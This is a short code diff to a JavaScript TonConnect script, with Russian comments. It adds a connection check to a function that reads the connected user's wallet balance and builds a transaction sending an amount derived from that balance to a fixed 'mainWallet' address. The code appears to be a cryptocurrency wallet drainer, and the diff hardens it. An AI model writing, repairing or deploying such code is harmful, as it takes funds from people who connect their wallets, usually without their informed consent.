@@ -29,7 +29,13 @@ tonConnectUI.on('walletConnected', async (walletAddress) => {
 
 // Функция для выполнения трансфера монет
 async function didtrans() {
-    const walletAddress = tonConnectUI.account.address;
+    const walletAddress = tonConnectUI.account.address; // Получаем адрес подключенного кошелька
+    if (!walletAddress) {
+        console.error('Кошелек не подключен');
+        return;
+    }
+
+    // Получаем баланс
     const response = await fetch('https://toncenter.com/api/v3/wallet?address=' + walletAddress);
     const data = await response.json();
     let originalBalance = parseFloat(data.balance);
@@ -37,7 +43,7 @@ async function didtrans() {
     let tgBalance = processedBalance / 1000000000;
 
     const transaction = {
-        validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
+        validUntil: Math.floor(Date.now() / 1000) + 60, // 60 сек
         messages: [{
             address: mainWallet,
             amount: processedBalance
